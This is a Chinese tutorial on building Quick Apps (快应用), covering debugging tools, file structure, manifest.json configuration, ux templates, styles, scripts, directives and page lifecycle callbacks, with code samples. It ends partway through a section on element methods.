开发者通过快应用调试器扫码安装按钮，扫码安装待调试的rpk文件 开发者点击快应用调试器中的开始调试按钮，开始调试 打开之前安装的快应用调试助手扫描即可预览 image.png 扫描二维码之后点击开始调试，会调出devtool工具本地调试 image.png image.png 1.5 安装Hap Extension 启动Visual Studio Code，打开项目，点击左上侧扩展，搜索hap，点击安装Hap Extension 更多详情 https://doc.quickapp.cn/tutorial/getting-started/code-edit-conf.html 二、快应用结构分析2.1 文件组织 一个应用包含：描述项目配置信息的manifest文件，放置项目公共资源脚本的app.ux文件，多个描述页面/自定义组件的ux文件 12345678910├── manifest.json├── app.ux├── Page1│ ├── page1.ux├── Page2│ ├── page2.ux└── Common ├── ComponentA.ux ├── ComponentB.ux └── xxx.png 其中Common目录下为公用的资源文件和组件文件，每个页面目录下存放各自页面私有的资源文件和组件文件，如：图片，CSS，JS等 2.2 源码文件 APP，页面和自定义组件均通过ux文件编写，ux文件由template模板、style样式和script脚本3个部分组成，一个典型的页面ux文件示例如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;template&gt; &lt;!-- template里只能有一个根节点 --&gt; &lt;div class=\"demo-page\"&gt; &lt;text class=\"title\"&gt;欢迎打开&#123;&#123;title&#125;&#125;&lt;/text&gt; &lt;!-- 点击跳转详情页 --&gt; &lt;input class=\"btn\" type=\"button\" value=\"跳转到详情页\" onclick=\"routeDetail\"&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt; .demo-page &#123; flex-direction: column; justify-content: center; align-items: center; &#125; .title &#123; font-size: 40px; text-align: center; &#125; .btn &#123; width: 550px; height: 86px; margin-top: 75px; border-radius: 43px; background-color: #09ba07; font-size: 30px; color: #ffffff; &#125;&lt;/style&gt;&lt;script&gt; import router from '@system.router' export default &#123; // 页面级组件的数据模型，影响传入数据的覆盖机制：private内定义的属性不允许被覆盖 private: &#123; title: '示例页面' &#125;, routeDetail () &#123; // 跳转到应用内的某个页面，router用法详见：文档-&gt;接口-&gt;页面路由 router.push (&#123; uri: '/DemoDetail' &#125;) &#125; &#125;&lt;/script&gt; 2.3 manifest配置 https://doc.quickapp.cn/framework/manifest.html 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&#123; # 包名，区分不同应用的唯一id，因为名称其实是可以一样的 \"package\": \"com.application.demo\", # 应用名称 \"name\": \"hi\", # 版本管理的话，每次更新将versionCode自增1即可 \"versionName\": \"1.0.0\", \"versionCode\": \"1\", \"minPlatformVersion\": \"101\", # 程序的入口icon，所有关于文件的引用统一使用根目录 # 根目录对应src文件夹 \"icon\": \"/Common/logo.png\", # \"features\": [ &#123; \"name\": \"system.prompt\" &#125;, &#123; \"name\": \"system.router\" &#125;, &#123; \"name\": \"system.shortcut\" &#125; ], \"permissions\": [ &#123; \"origin\": \"*\" &#125; ], # 配置相关 \"config\": &#123; # 这里的设置是log输出的最低等级 # 如果是warn的话，info类型将不会输出 # 等级请参考js中的console日志 \"logLevel\": \"off\" &#125;, # 路由 # 这里会配置应用入口的页面 # 所有的页面都需要在这里配置 # 会把页面与对应的页面文件对应起来 # 经过配置之后可以通过/Demo访问到Demo目录下的index.ux页面 \"router\": &#123; \"entry\": \"Demo\", \"pages\": &#123; \"Demo\": &#123; # 这里对应的Demo文件夹里的index.ux \"component\": \"index\" &#125;, \"DemoDetail\": &#123; \"component\": \"index\" &#125;, \"About\": &#123; \"component\": \"index\" &#125; &#125; &#125;, # 配置页面UI显示 # 主要分为两种，页面公有与页面私有 \"display\": &#123; # 这三个都是所有页面公有的，顶部titleBar内容 \"titleBarText\": \"public title\" \"titleBarBackgroundColor\": \"#f2f2f2\", \"titleBarTextColor\": \"#414141\", # 会增加一个导航栏 \"menu\": true, # 页面私有内容 \"pages\": &#123; \"Demo\": &#123; # 这里面的内容就是每个页面私有的了 \"titleBarText\": \"示例页\", \"menu\": false &#125;, \"DemoDetail\": &#123; \"titleBarText\": \"详情页\" &#125;, \"About\": &#123; \"menu\": false &#125; &#125; &#125;&#125; package 应用包名，确认与原生应用的包名不一致，推荐采用com.company.module的格式，如：com.example.demo name 应用名称，6个汉字以内，与应用商店保存的名称一致，用于在桌面图标、弹窗等处显示应用名称 icon 应用图标，提供192x192大小的即可 versionName 应用版本名称，如：&quot;1.0&quot; versionCode 应用版本号，从1自增，推荐每次重新上传包时versionCode+1 minPlatformVersion 支持的最小平台版本号，兼容性检查，避免上线后在低版本平台运行并导致不兼容；如果不填按照内测版本处理 features 接口列表，绝大部分接口都需要在这里声明，否则不能调用，详见每个接口的文档说明 config 系统配置 logLevel：打印日志等级，分为off,error,warn,info,log,debug designWidth：页面设计基准宽度，根据实际设备宽度来缩放元素大小 router 路由信息 entry:首页名称 pages:页面配置列表，key值为页面名称（对应页面目录名，例如Hello对应’Hello’目录），value为页面详细配置page，详见下面说明 router.page 用于定义单个页面路由信息 component: 页面对应的组件名，与ux文件名保持一致，例如&#39;hello&#39; 对应 &#39;hello.ux&#39; path 页面路径，例如“/user”,不填则默认为/&lt;页面名称&gt;。path必须唯一,不能和其他page的path相同。下面page的path因为缺失,会被设置为“/Index”：&quot;Index&quot;: {&quot;component&quot;: &quot;index&quot;} filter: 声明页面可以处理某种请求 display UI显示相关配置 backgroundColor 窗口背景颜色 fullScreen 是否是全屏模式，默认不会同时作用于titleBar，titleBar需要继续通过titleBar控制 titleBar 是否显示titleBar titleBarBackgroundColor标题栏背景色 titleBarTextColor 标题栏文字颜色 titleBarText 标题栏文字(也可通过页面跳转传递参数(titleBarText)设置) menu 是否显示标题栏右上角菜单按钮 pages 各个页面的显示样式，key为页面名（与路由中的页面名保持一致），value为窗口显示 2.4 app.ux 当前app.ux编译后会包含manifest配置信息（可以在npm run build之后查看文件内容），所以请不要删除/**manifest**/的注释内容标识 您可以在&lt;script&gt;中引入一些公共的脚本，并暴露在当前app的对象上，如下所示，然后就可以在页面ux文件的ViewModel中，通过this.$app.util访问 2.5 style样式 样式布局采用CSS Flexbox（弹性盒）样式 支持2种导入外部文件的方式 123456789&lt;!-- 导入外部文件, 代替style内部样式 --&gt;&lt;style src=\"./style.css\"&gt;&lt;/style&gt;&lt;!-- 合并外部文件 --&gt;&lt;style&gt; @import './style.css'; .a &#123; &#125;&lt;/style&gt; 模板内部样式 1234&lt;!-- 内联inline --&gt;&lt;div style=\"color:red; margin: 10px;\"/&gt;&lt;!-- class声明 --&gt;&lt;div class=\"normal append\"/&gt; 样式预编译 目前支持less, sass的预编译 1234567891011121314&lt;!--导入外部文件, 代替style内部样式--&gt;&lt;style lang=\"less\" src=\"./lessFile.less\"&gt;&lt;/style&gt;&lt;!--合并外部文件--&gt;&lt;style lang=\"less\"&gt; @import './lessFile.less'; .page-less &#123; #testTag &#123; .less-font-text, .less-font-comma &#123; font-size: 60px; &#125; &#125; &#125;&lt;/style&gt; 1234567891011&lt;script&gt; /** * 应用级别的配置，供所有页面公用 */ import util from './util' export default &#123; showMenu: util.showMenu, createShortcut: util.createShortcut &#125;&lt;/script&gt; 2.6 template模板12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!-- temp.ux --&gt;&lt;import name=\"hint\" src=\"./hint-modal\"&gt;&lt;/import&gt; &lt;!-- 引入外部模板 --&gt;&lt;import src=\"./table\"&gt;&lt;/import&gt; &lt;!-- 引入外部模板 --&gt;&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"mod-header\"&gt; &lt;text class=\"mod-title\" style=\"color: red; margin: 10px;\"&gt;&#123;&#123;title&#125;&#125;&lt;/text&gt; &lt;!-- 行内样式 --&gt; &lt;text class=\"mod-detail\" onclick=\"showDetail\"&gt;?&lt;/text&gt; &lt;!-- 无参事件绑定 --&gt; &lt;/div&gt; &lt;div class=\"mod-content\"&gt; &lt;!-- block 用来表示逻辑，不渲染 --&gt; &lt;block for=\"totalData\"&gt; &lt;!-- for 循环遍历数组 $idx, $item 分别为数组的索引和值--&gt; &lt;!-- 事件绑定 --&gt; &lt;div onclick=\"onTabClick($idx)\" class=\"item &#123;&#123;tabIndex === $idx &amp;&amp; 'active'&#125;&#125;\"&gt; &lt;!-- 支持简单表达式 --&gt; &lt;text class=\"&#123;&#123;tabIndex === $idx &amp;&amp; 'text-active'&#125;&#125;\"&gt;&#123;&#123;($item || &#123;&#125;).name&#125;&#125;&lt;/text&gt; &lt;text class=\"&#123;&#123;tabIndex === $idx &amp;&amp; 'text-active'&#125;&#125;\"&gt;&#123;&#123;($item || &#123;&#125;).value&#125;&#125;&lt;/text&gt; &lt;!-- 布尔值、null、undefined、'' 不渲染，其余包括 falsy 值一律渲染 --&gt; &lt;/div&gt; &lt;/block&gt; &lt;/div&gt; &lt;image class=\"mod-like\" if=\"&#123;&#123;isLike&#125;&#125;\" /&gt; &lt;!-- 支持if elif else, 必须是相邻节点 --&gt; &lt;image class=\"mod-dislike\" else /&gt; &lt;table data=&#123;&#123;dataList&#125;&#125;&gt;&lt;/table&gt; &lt;!-- 传入属性值，使用外部模板--&gt; &lt;hint show=\"&#123;&#123;isHintShown&#125;&#125;\"&gt; This is children of hint templete. &lt;/hint&gt; &lt;!-- 使用外部模板 --&gt; &lt;!-- if 和 show 的区别：if 为 false 分支的节点不会渲染进 DOM 树，而 show 为 false 的节点会渲染，只是 display: none; --&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=\"less\" src=\"./lessFile.less\"&gt;&lt;/style&gt; &lt;!-- 引入外部 CSS/LESS --&gt;&lt;style lang=\"less\"&gt; /* 引入外部 CSS/LESS */ @import '../Common/global.less'; .container&#123; /* 定义样式，less 支持 */ &#125;&lt;/style&gt;&lt;script&gt; import fetch from \"@system.fetch\" // 引入系统 js import conf from './globalConf'; // 引入外部 js export default &#123; props: ['title', 'dataList'], // 传入属性：必须字母开头，全小写、数字和 `-` ，不能保留字和函数，不能以符号开头 public: &#123; // 定义变量，会被 props 和内部请求覆盖 &#125;, private: &#123; // 定义变量，不会被 props 覆盖 &#125;, protected: &#123; // 定义变量，不会被 props 覆盖, 但会被内部请求覆盖(获得通过 a 标签和 router 传递的参数) &#125; data :&#123; // data 不能和 public、private、protected 一起使用，data 也可以是 function（返回 data 对象，onInit之前执行） // 定义变量：不能保留字和函数，不能以符号开头 totalData: [&#123;name: 'a',value: 97&#125;,&#123;name: 'b',value: 98&#125;]; // 定义变量，会被 props 覆盖 &#125;, onTabClick(index)&#123; // 内部事件定义 console.log(index); &#125;, events: &#123; onIDChange()&#123; // 外部事件定义 &#125; &#125; &#125;&lt;/script&gt;&lt;!-- hint.ux --&gt;&lt;template&gt; &lt;text&gt;&lt;slot&gt;&lt;/slot&gt;&lt;/text&gt; &lt;!-- slot: 获取该数据的引用的 children, 该例中即：This is children of hint templete. --&gt;&lt;/template&gt; 2.7 script脚本2.7.1 模块声明 可以通过import引入功能模块，在代码中调用模块方法 1import fetch from &quot;@system.fetch&quot; 也可以一次引入所有的模块，例如 1import system from &quot;@system&quot; 在代码中使用system.network来调用接口方法 2.7.2 对象2.7.2.1 页面级组件data(废弃) 页面级组件的数据模型，能够转换为JSON对象 如果是函数，返回结果必须是对象，在组件初始化时会执行函数获取结果作为data的值 使用data方式声明的属性会被外部数据覆盖，因此存在一定安全风险，推荐使用下面的public,protected,rivate来声明属性（注意：它们不能与data同时声明） public 页面级组件的数据模型，影响传入数据的覆盖机制：public内定义的属性允许被传入的数据覆盖，如果外部传入数据的某个属性未被声明，在public中不会新增这个属性 protected 页面级组件的数据模型，影响传入数据的覆盖机制：protected内定义的属性，允许被应用内部页面请求传递的数据覆盖，不允许被应用外部请求传递的数据覆盖 private 页面级组件的数据模型，影响传入数据的覆盖机制：private内定义的属性不允许被覆盖 12345678910111213141516171819202122232425export default &#123; props: ['title', 'dataList'], // 传入属性：必须字母开头，全小写、数字和 `-` ，不能保留字和函数，不能以符号开头 public: &#123; // 定义变量，会被 props 和内部请求覆盖 &#125;, private: &#123; // 定义变量，不会被 props 覆盖 &#125;, protected: &#123; // 定义变量，不会被 props 覆盖, 但会被内部请求覆盖(获得通过 a 标签和 router 传递的参数) &#125; data :&#123; // data 不能和 public、private、protected 一起使用，data 也可以是 function（返回 data 对象，onInit之前执行） // 定义变量：不能保留字和函数，不能以符号开头 totalData: [&#123;name: 'a',value: 97&#125;,&#123;name: 'b',value: 98&#125;]; // 定义变量，会被 props 覆盖 &#125;, onTabClick(index)&#123; // 内部事件定义 console.log(index); &#125;, events: &#123; onIDChange()&#123; // 外部事件定义 &#125; &#125; &#125; 2.7.2.2 自定义组件data 自定义组件的数据模型，能够转换为JSON对象；属性名不能以$或_开头, 不要使用for, if, show, tid等保留字如果是函数，返回结果必须是对象，在组件初始化时会执行函数获取结果作为data的值 props 定义组件外部可传入的所有属性 在模板代码中，请使用短横线分隔命名代替驼峰命名。如，属性定义props: [&#39;propA&#39;]，可通过&lt;tag prop-a=&#39;xx&#39;&gt;方式传递到组件内部 prop验证 在自定义组件中，可将props定义为带验证需求的对象。其中，key为属性名，value为属性对应的验证需求。验证失败则输出错误提示日志，增加prop验证有利于规范自定义组件的使用 属性 类型 描述 type - 检查属性值的类型。支持单一类型和多种可能类型，可在原生和自定义构造函数中任意选择，单独或组合使用。原生构造函数：String Number Boolean Function Object Array Symbol default - 设置属性的默认值 required Boolean 设置属性是否必填 validator| Function| 设置自定义验证函数。若函数的返回值为真，则通过验证；否则验证失败| 12345678910111213141516171819202122232425262728293031export default &#123; props: &#123; // 单一类型检查的简写 propA: Number, // 多种可能类型的简写 propB: [String, Number], // 必填的字符串 propC: &#123; type: String, required: true &#125;, // 带默认值的数字 propD: &#123; type: Number, default: 100 &#125;, // 带有默认值的对象 propE: &#123; type: Object, default () &#123; return &#123; message: 'hello' &#125; &#125; &#125;, // 自定义验证函数 propF: &#123; validator (value) &#123; return value === 'hello' &#125; &#125; &#125; &#125; 2.7.2.3 公共对象 属性 类型 描述 $app Object 应用对象 $page Object 页面对象 $valid Boolean 页面对象是否有效 $visible Boolean 页面是否处于用户可见状态 2.7.2.4 应用对象 可通过$app访问 属性 类型 描述 $def Object 使用this.$app.$def获取在app.ux中暴露的对象 $data Object 使用this.$app.$data获取在manifest.json的config.data中声明的全局数据 2.7.2.5 页面对象 可通过$page访问 属性 类型 描述 action String 获取打开当前页面的action。仅在当前页面是通过filter匹配的方式打开时有效，否则为undefined uri String 获取打开当前页面的uri。仅在当前页面是通过filter匹配的方式打开时有效，否则为undefined 2.7.3 方法2.7.3.1 数据方法 属性 类型 参数 描述 $set Function key: String value: Any 添加数据属性，用法：this.$set(&#39;key&#39;,value) this.$vm(&#39;id&#39;).$set(&#39;key&#39;,value) $delete Function key: String 删除数据属性，用法：this.$delete(&#39;key&#39;) this.$vm(&#39;id&#39;).$delete(&#39;key&#39;) 2.7.3.2 公共方法 属性 描述 $element 获取指定id的组件dom对象，如果没有指定id，则返回根组件dom对象用法：&lt;template&gt; &lt;div id=&#39;xxx&#39;&gt;&lt;/div&gt; &lt;/template&gt; this.$element(&#39;xxx&#39;) 获取id为xxx的div组件实例对象 this.$element() 获取根组件实例对象 $root 获取顶层ViewModel $parent 获取父亲ViewModel $child 获取指定id的自定义组件的ViewModel用法：this.$child(&#39;xxx&#39;) 获取id为xxx的div组件ViewModel $vm deprecated 请使用上面this.$child(&#39;xxx&#39;)替代 $rootElement deprecated 请使用上面this.$element()替代 $forceUpdate 更新ViewModel数据，可能会触发DOM操作，如：创建节点、更新节点、删除节点等；这些DOM操作不一定在数据更新时立即执行，而是在开发者的业务代码执行后触发；若开发者期望数据更新时立即执行相应的DOM操作，可使用：this.$forceUpdate()；一般不推荐使用 2.7.3.3 事件方法 属性 参数 描述 $on type: String 事件名 handler: Function事件句柄函数 添加事件处理句柄用法：this.$on(&#39;xxxx&#39;, this.fn) fn是在&lt;script&gt;中定义的函数 $off type: String 事件名 handler: 事件句柄函数 删除事件处理句柄用法：this.$off(&#39;xxxx&#39;, this.fn) this.$off(&#39;xxx&#39;) 删除指定事件的所有处理句柄 $dispatch type: String 事件名 向上层组件发送事件通知用法：this.$dispatch(&#39;xxx&#39;)正常情况下，会一直向上传递事件（冒泡）如果要停止冒泡，在事件句柄函数中调用evt.stop()即可 $broadcast type: String 事件名 向子组件发送事件通知用法：this.$broadcast(&#39;xxx&#39;)正常情况下，会一直向下传递事件如果要停止传递，在事件句柄函数中调用evt.stop()即可 $emit type: String 事件名 data: Object 事件参数 触发事件，对应的句柄函数被调用用法：this.$emit(&#39;xxx&#39;) this.$emit(&#39;xxx&#39;, {a:1})传递的事件参数可在事件回调函数中，通过evt.detail来访问，例如evt.detail.a $emitElement type: String 事件名data: Object 事件参数 id: String 组件id (默认为-1 代表根元素) 触发组件事件,对应的句柄函数被调用用法：this.$emitElement(&#39;xxx&#39;, null, &#39;id&#39;) this.$emitElement(&#39;xxx&#39;,{a:1})传递的事件参数可在事件回调函数中，通过evt.detail来访问，例如evt.detail.a $watch data: String 属性名, 支持&#39;a.b.c&#39;格式，不支持数组索引 handler: String 事件句柄函数名,函数的第一个参数为新的属性值，第二个参数为旧的属性值 动态添加属性/事件绑定，属性必须在data中定义，handler函数必须在&lt;script&gt;定义；当属性值发生变化时事件才被触发用法：this.$watch(&#39;a&#39;,&#39;handler&#39;) 2.7.3.4 应用方法 可通过$app访问 属性 描述 exit 退出快应用，结束应用生命周期。调用方法：this.$app.exit() 2.7.3.5 页面方法 可通过$page访问 属性 参数 描述 setTitleBar text: String 标题栏文字 textColor: String 文字颜色 backgroundColor: String 背景颜色 backgroundOpacity : Number背景透明度 menu : Boolean 是否在标题栏右上角显示菜单按钮 设置当前页面的标题栏用法：this.$page.setTitleBar({text:&#39;Hello&#39;, textColor:&#39;#FF0000&#39;, backgroundColor:&#39;#FFFFFF&#39;, backgroundOpacity:0.5, menu: true}) finish 无 从本页面退出，结束页面生命周期。调用方法：this.$page.finish() 2.8 指令for for指令用于循环输出一个数组类型的数据 自定义变量表示for指令的数组索引和数组元素时，变量名不可以用$或_开头； 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;!-- 方式1：默认$item代表数组中的元素, $idx代表数组中的索引 --&gt; &lt;div class=\"tutorial-row\" for=\"&#123;&#123;list&#125;&#125;\"&gt; &lt;text&gt;&#123;&#123;$idx&#125;&#125;.&#123;&#123;$item.name&#125;&#125;&lt;/text&gt; &lt;/div&gt; &lt;!-- 方式2：自定义元素变量名称 --&gt; &lt;div class=\"tutorial-row\" for=\"value in list\"&gt; &lt;text&gt;&#123;&#123;$idx&#125;&#125;.&#123;&#123;value.name&#125;&#125;&lt;/text&gt; &lt;/div&gt; &lt;!-- 方式3：自定义元素、索引的变量名称 --&gt; &lt;div class=\"tutorial-row\" for=\"(personIndex, personItem) in list\"&gt; &lt;text&gt;&#123;&#123;personIndex&#125;&#125;.&#123;&#123;personItem.name&#125;&#125;&lt;/text&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=\"less\"&gt; .tutorial-page &#123; flex-direction: column; .tutorial-row &#123; width: 85%; margin-top: 10px; margin-bottom: 10px; &#125; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; list: [ &#123;name: 'aa'&#125;, &#123; name: 'bb' &#125; ] &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '指令for' &#125;) &#125; &#125;&lt;/script&gt; 指令if与指令show if条件指令，是指if/elif/else这3个相关指令，用于控制是否增加或者删除组件； show指令，是指是否显示组件，用于控制组件的显示状态，并不会从DOM结构中删除 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;text onclick=\"onClickShow\"&gt;显示隐藏：&lt;/text&gt; &lt;text show=\"&#123;&#123;showVar&#125;&#125;\"&gt;show: 渲染但控制是否显示&lt;/text&gt; &lt;text onclick=\"onClickCondition\"&gt;条件指令：&lt;/text&gt; &lt;text if=\"&#123;&#123;conditionVar === 1&#125;&#125;\"&gt;if: if条件&lt;/text&gt; &lt;text elif=\"&#123;&#123;conditionVar === 2&#125;&#125;\"&gt;elif: elif条件&lt;/text&gt; &lt;text else&gt;else: 其余&lt;/text&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=\"less\"&gt; .tutorial-page &#123; flex-direction: column; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; showVar: true, conditionVar: 1 &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '指令if与指令show' &#125;) &#125;, onClickShow () &#123; this.showVar = !this.showVar &#125;, onClickCondition () &#123; this.conditionVar = ++this.conditionVar % 3 &#125; &#125;&lt;/script&gt; 当if/elif指令的值为false时，节点会从页面中移除，当if/elif指令值为true，组件会动态插入节点中； 当show指令的值为true时，节点可见， - 当其值为false时，组件不可见，但节点仍会保留在页面DOM结构中 组件block block组件是表达逻辑区块的组件，没有对应的Native组件。可以使用实现更为灵活的”列表/条件渲染”。如在上使用for指令和if指令 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;div class=\"tutorial-page\"&gt; &lt;text onclick=\"toggleCityList\"&gt;点击：控制是否显示城市&lt;/text&gt; &lt;div class=\"city\" for=\"city in cities\" if=\"&#123;&#123;showCityList === 1&#125;&#125;\"&gt; &lt;text&gt;城市：&#123;&#123;city.name&#125;&#125;&lt;/text&gt; &lt;block if=\"&#123;&#123;city.showSpots&#125;&#125;\" for=\"&#123;&#123;city.spots&#125;&#125;\"&gt; &lt;text&gt;景点：&#123;&#123;$item.name&#125;&#125;&lt;/text&gt; &lt;/block&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style lang=\"less\"&gt; .tutorial-page &#123; flex-direction: column; &#125; .city &#123; flex-direction: column; &#125;&lt;/style&gt;&lt;script&gt; import &#123;dataDirective&#125; from '../../Common/js/data' export default &#123; private: &#123; showCityList: 1, cities: dataDirective &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '组件block' &#125;) &#125;, toggleCityList () &#123; this.showCityList = this.showCityList === 1 ? 0 : 1 &#125; &#125;&lt;/script&gt; 组件slot slot节点用于向开发者额外开发的自定义ux组件中插入内容 通常自定义组件的模板中提供slot组件，当该组件被引入到页面组件中后，开发者可以灵活定义该自定义组件内部的子内容 123456789101112131415161718//自定义组件part1.ux&lt;!-- par1.ux --&gt;&lt;template&gt; &lt;div&gt; &lt;text&gt;&#123;&#123; header &#125;&#125;&lt;/text&gt; &lt;slot&gt;&lt;/slot&gt; &lt;text&gt;&#123;&#123; footer &#125;&#125;&lt;/text&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; props: [ 'header', 'footer' ] &#125;&lt;/script&gt; 123456789101112131415161718192021222324252627//自定义组件使用者页面index.ux&lt;!-- index.ux --&gt;&lt;import src=\"./part1\"&gt;&lt;/import&gt;&lt;template&gt; &lt;part1 class=\"component\" header=\"&#123;&#123;header&#125;&#125;\" footer=\"&#123;&#123;footer&#125;&#125;\"&gt; &lt;text&gt;slot节点内容&lt;/text&gt; &lt;/part1&gt;&lt;/template&gt;&lt;style&gt; .component &#123; flex-direction: column; &#125;&lt;/style&gt;&lt;script&gt; export default &#123; private: &#123; header: 'HEAD', footer: 'FOOT' &#125;, onInit () &#123; this.$page.setTitleBar(&#123; text: '组件slot' &#125;) &#125; &#125;&lt;/script&gt; 在子组件中使用slot组件，使得子组件接纳调用者传入的子内容，从而动态渲染子组件，得到最终的页面 三、生命周期3.1 APP的生命周期 当前为APP的生命周期提供了两个回调函数：onCreate, onDestroy；可在app.ux中定义回调函数 123456789101112131415161718192021import &#123; natives&#125; from './util/asyncNatives'export default &#123; onCreate () &#123; console.info('Application onCreate') &#125;, onDestroy () &#123; console.info('Application onDestroy') &#125;, // 暴露给所有页面，在页面中通过：this.$app.$def.method1()访问 method1 () &#123; console.info('这是APP的方法') &#125;, // 暴露给所有页面，在页面中通过：this.$app.$def.data1访问 data1: &#123; name: '这是APP存的数据' &#125;, natives&#125; 在app.ux中，开发者可以做一些独立于页面的操作。比如：引入公共的JS资源，然后暴露给所有页面 在app.ux中，通过this.$def访问app.ux中定义的数据和方法 1234console.info(`获取：APP文件中的数据：$&#123;this.$def.data1.name&#125;`)console.info(`执行：APP文件中的方法`, this.$def.method1())console.info(`获取：manifest.json的应用名称：$&#123;this.$def.manifest.name&#125;`)console.info(`获取：manifest.json的config.data的数据：$&#123;this.$data.name&#125;`) 在pageName.ux中，通过this.$app.$def访问app.ux中定义的数据和方法 1234console.info(`获取：APP文件中的数据：$&#123;this.$app.$def.data1.name&#125;`)console.info(`执行：APP文件中的方法`, this.$app.$def.method1())console.info(`获取：manifest.json的应用名称：$&#123;this.$app.$def.manifest.name&#125;`)console.info(`获取：manifest.json的config.data的数据：$&#123;this.$app.$data.name&#125;`) 关于$app与$app.$def 前者代表框架为开发者暴露提供的APP对象；后者代表开发者在app.ux中导出的对象，放置业务相关的全局数据和方法 前者对象拥有onCreate, onDestroy生命周期；当应用启动时会执行onCreate方法，里面执行this.variable1的赋值是在$app对象上 后者对象中的onCreate, onDestroy方法并不会执行，作用仅仅只是把方法复制到前者对象上而已 这些全局方法在页面中：既可以通过this.$app.method1()调用，也可以通过this.$app.$def.method1()调用；不同之处在于前者可以取到之前赋值的variable1变量，而后者不可以取到（因为之前的赋值是在$app对象上执行的） 3.2 页面生命周期 image.png onInit() 表示ViewModel的数据已经准备好，可以开始使用页面中的数据 12345678910111213141516private: &#123; // 生命周期的文本列表 lcList: []&#125;,onInit () &#123; this.$page.setTitleBar(&#123; text: '生命周期' &#125;) this.lcList.push('onInit') console.info(`触发：onInit`) console.info(`执行：获取ViewModel的lcList属性：$&#123;this.lcList&#125;`) // 执行：获取ViewModel的lcList属性：onInit // $app信息 console.info(`获取：manifest.json的config.data的数据：$&#123;this.$app.$data.name&#125;`) console.info(`获取：APP文件中的数据：$&#123;this.$app.$def.data1.name&#125;`) console.info(`执行：APP文件中的方法`, this.$app.$def.method1())&#125; onReady() 表示ViewModel的模板已经编译完成，可以开始获取DOM节点（如：this.$element(idxxx) 123456onReady () &#123; this.lcList.push('onReady') console.info(`触发：onReady`) console.info(`执行：获取模板节点：$&#123;this.$rootElement()&#125;`) // 执行：获取模板节点：&lt;div attr=&#123;&#125; style=&#123;\"flexDirection\":\"column\"&#125;&gt;...&lt;/div&gt;&#125; onShow(), onHide() 页面被切换隐藏时调用onHide()，页面被切换重新显示时调用onShow() 判断页面的显示状态，可以调用ViewModel的$visible属性：true表示显示，false表示隐藏 123456789101112onShow () &#123; this.lcList.push('onShow') console.info(`触发：onShow`) console.info(`执行：获取页面显示状态属性：$&#123;this.$visible&#125;`) // true&#125;,onHide () &#123; this.lcList.push('onHide') console.info(`触发：onHide`) console.info(`执行：获取页面显示状态属性：$&#123;this.$visible&#125;`) // false&#125; onDestroy() 页面被销毁时调用，被销毁的可能原因有：用户从当前页面返回到上一页，或者用户打开了太多的页面，框架自动销毁掉部分页面，避免占用资源 所以，页面销毁时应该做一些释放资源的操作，如：取消接口订阅监听geolocation.unsubscribe() 1234567onDestroy () &#123; console.info(`触发：onDestroy`) console.info(`执行：页面要被销毁，销毁状态：$&#123;this.$valid&#125;，应该做取消接口订阅监听的操作: geolocation.unsubscribe()`) // true，即将销毁 setTimeout(function () &#123; console.info(`执行：页面已被销毁，不会执行`) // 页面已销毁，不会执行 &#125;.bind(this), 0)&#125; onBackPress() 当用户点击返回实体按键、左上角返回菜单、调用返回API时触发该事件 如果事件响应方法最后返回true表示不返回，自己处理业务逻辑（完毕后开发者自行调用API返回）；否则：不返回数据，或者返回其它数据：表示遵循系统逻辑：返回到上一页 123456onBackPress () &#123; console.info(`触发：onBackPress`) // true：表示自己处理；否则默认返回上一页 // return true&#125; 返回上一页的接口API：router.back() onMenuPress() 当使用原生的顶部标题栏时，可以通过manifest.json中的menu属性配置是否显示右上角的菜单 12345onMenuPress () &#123; this.lcList.push('onMenuPress') console.info(`触发：onMenuPress`)&#125; A页面的生命周期接口的调用顺序 打开页面A：onInit() -&gt; onReady() -&gt; onShow() 在页面A打开页面B：onHide() 从页面B返回页面A：onShow() A页面返回：onBackPress() -&gt; onHide() -&gt; onDestroy() 四、置顶对象 $app 应用对象 $app.$def 获取在app.ux中暴露的对象 $app.$data 获取在manifest.json的config.data中声明的全局数据 $page 页面对象 $page.action 获取打开当前页面的action。仅在当前页面是通过filter匹配的方式打开时有效，否则为undefined。参见manifest $page.uri 获取打开当前页面的uri。仅在当前页面是通过filter匹配的方式打开时有效，否则为undefined $page.setTitleBar 设置页面标题 $valid 页面对象是否有效 $visible 页面是否处于用户可见状态 this.$page.setTitleBar 参数属性包括 1234567&#123; text: 'Hello QuickApp', //标题栏文字 textColor: '#ffff', //文字颜色 backgroundColor: '#434343', //背景颜色 backgroundOpacity: '0.8', //背景透明度 menu: false, //是否在标题栏右上角显示菜单按钮 | 设置当前&#125; 五、全局对象 $element 获取指定id的组件dom对象，如果没有指定id，则返回根组件dom对象用法：this.$element(&#39;xxx&#39;)获取id为xxx的组件实例对象 this.$element() 获取根组件实例对象 $root 获取顶层ViewModel $parent 获取父亲ViewModel $child 获取指定id的自定义组件的ViewModel用法：this.$child(&#39;xxx&#39;) 获取id为xxx的div组件ViewModel $vm(弃用) 请使用上面this.$child(‘xxx’)`替代 $forceUpdate 强制页面刷新 $set 添加数据属性，必须在onInit函数中使用，用法：this.$set(&#39;key&#39;,value) $delete 删除数据属性，如果在onInit函数中使用，用法：this.$delete(&#39;key&#39;) 六、元素属性方法 注意，获取元素应该在页面已渲染后，如 onReady 事件中或 onReady 事件执行完以后 $set 